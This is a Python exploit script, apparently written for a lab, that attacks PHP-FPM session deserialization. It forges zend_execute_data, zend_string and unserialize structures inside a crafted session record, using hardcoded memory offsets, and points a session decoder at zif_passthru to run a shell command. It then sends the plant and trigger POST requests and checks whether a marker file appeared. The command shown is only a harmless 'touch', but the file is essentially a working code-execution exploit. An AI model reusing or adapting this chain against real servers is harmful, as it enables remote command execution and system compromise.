#!/usr/bin/env python3
"""Final/single-name zif_passthru chain: fake execute_data in the first session key.

Flow: script-level plant OOM (worker survives) -> upload-progress trigger whose
first decode poisons ps_serializers[1].decode with zif_passthru and whose flush
record starts with the fake execute_data name.
"""
import hashlib, json, os, struct, sys, time
LAB = "/tmp/opencode/research/drupal_fpm_20261022T013000Z"
sys.path.insert(0, LAB)
import tool
from tool import field, filepart

TOTAL = 81920
P = int(sys.argv[1], 0) if len(sys.argv)>1 else 0x7f5e6aa82000
X = int(sys.argv[2], 0) if len(sys.argv)>2 else 0x7f5e6aa70000
S = int(sys.argv[3], 0) if len(sys.argv)>3 else 0x7f5e6aa85018
TRIGGER = sys.argv[4] if len(sys.argv)>4 else '/exploit/sess.php'
TARGET = 0x22c54c8
ZIF = 0xa3c074
D_OFF = 0x88
CMD = b"touch /tmp/opencode/research/drupal_fpm_20261022T013000Z/MARKER_PASSTHRU;"
D = P + D_OFF
K = (TARGET - (D + 0x10)) // 16
assert (TARGET - (D + 0x10)) % 16 == 0 and K < 0
F = S + 0x200
VAL = b"i:%d;" % ZIF
NAME_LEN = TOTAL - 1 - len(VAL)          # 81920 - 1 - 11 = 81908
OUT = LAB + "/arms/zif_run_%d.json" % int(time.time())

def build():
    name = bytearray(b'A' * NAME_LEN)
    name[0:0x300] = b'\x00' * 0x300
    # fake zend_execute_data at S
    name[0x18:0x20] = struct.pack('<Q', F)
    name[0x2c:0x30] = struct.pack('<I', 1)
    name[0x50:0x58] = struct.pack('<Q', F)
    name[0x58:0x5c] = struct.pack('<I', 6)
    # fake zend_string at F = S+0x200
    name[0x210:0x218] = struct.pack('<Q', len(CMD))
    name[0x218:0x218+len(CMD)] = CMD
    # fake php_unserialize_data at P (inside the name)
    p_off = P - (X + 24)
    assert 0 <= p_off and p_off + 0x48 <= NAME_LEN, (hex(p_off), NAME_LEN)
    name[p_off+0x00:p_off+0x08] = struct.pack('<Q', P + 56)
    name[p_off+0x08:p_off+0x10] = struct.pack('<Q', D)
    name[p_off+0x10:p_off+0x18] = struct.pack('<Q', D)
    name[p_off+0x18:p_off+0x20] = struct.pack('<Q', 0)
    name[p_off+0x20:p_off+0x28] = struct.pack('<Q', 0)
    name[p_off+0x28:p_off+0x30] = struct.pack('<Q', 0)
    name[p_off+0x30:p_off+0x38] = struct.pack('<Q', 0x7fffffff)
    name[p_off+0x38:p_off+0x40] = struct.pack('<Q', 0)
    name[p_off+0x40:p_off+0x48] = struct.pack('<Q', 0)
    # fake var_dtor_entries at D
    d_off = p_off + D_OFF
    assert d_off + 0x10 <= NAME_LEN
    name[d_off:d_off+0x08] = struct.pack('<q', K)
    name[d_off+0x08:d_off+0x10] = struct.pack('<Q', 0)
    rec = bytes(name) + b'|' + VAL
    assert len(rec) == TOTAL, (len(rec), TOTAL)
    assert b'|' not in name, ('pipe in name at', name.find(b'|'))
    return rec, {'p_off':p_off,'d_off':d_off,'K':K,'F':F,'NAME_LEN':NAME_LEN,'S':S}

def current_worker():
    for d in os.listdir('/proc'):
        if not d.isdigit(): continue
        try:
            ppid=int(open('/proc/%s/stat'%d).read().split()[3]); cmd=open('/proc/%s/cmdline'%d,'rb').read().replace(b'\0',b' ').decode('latin1')
        except: continue
        if ppid==144755 and 'pool lab' in cmd: return int(d)
    return None

w0=current_worker()
rec,geo=build()
res={'worker0':w0,'P':P,'X':X,'S':S,'trigger_path':TRIGGER,'target':TARGET,'zif':ZIF,'geo':geo,
     'name_pipe':rec.index(b'|'),'cmd_len':len(CMD)}
# marker
marker='/tmp/opencode/research/drupal_fpm_20261022T013000Z/MARKER_PASSTHRU'
try: os.unlink(marker)
except FileNotFoundError: pass
res['marker_before']=os.path.exists(marker)
res['plant_seed']=tool.seed(os.path.join(tool.SESS,'sess_pl1'),tool.PLANT_REC)
res['trigger_seed']=tool.seed(os.path.join(tool.SESS,'sess_tb1'),rec)
# 1) plant script OOM, worker survives
r=tool.post('/exploit/sess.php',[field('form',b'x')],tag='zr_plant',timeout=60,cookie='pl1')
res['plant']={'status':r['status'],'head':r['body'][:200].decode('latin1')}
time.sleep(0.7)
w1=current_worker(); res['worker_after_plant']=w1
# 2) trigger upload progress: first decode poisons decoder; second/third decode call zif_passthru
r=tool.post(TRIGGER,[field('PHP_SESSION_UPLOAD_PROGRESS',b'x'),filepart()],tag='zr_trigger',timeout=120,cookie='tb1')
res['trigger']={'status':r['status'],'head':r['body'][:300].decode('latin1')}
time.sleep(0.8)
res['marker_after_trigger']=os.path.exists(marker)
if res['marker_after_trigger']:
    st=os.stat(marker); res['marker']={'path':marker,'size':st.st_size,'mtime_ns':st.st_mtime_ns}
w2=current_worker(); res['worker_after_trigger']=w2
# 3) health request, same lab worker, no session decode
try:
    r=tool.post('/exploit/health.php',[field('form',b'x')],tag='zr_health',timeout=30)
    res['health']={'status':r['status'],'head':r['body'][:100].decode('latin1')}
except Exception as e:
    res['health']={'err':str(e)}
time.sleep(0.3)
res['worker_after_health']=current_worker()
raw=open(os.path.join(tool.SESS,'sess_tb1'),'rb').read()
res['file']={'len':len(raw),'sha1':hashlib.sha1(raw).hexdigest(),'head':raw[:64].hex()}
json.dump(res,open(OUT,'w'),indent=1,default=str)
print(json.dumps(res,indent=1,default=str))
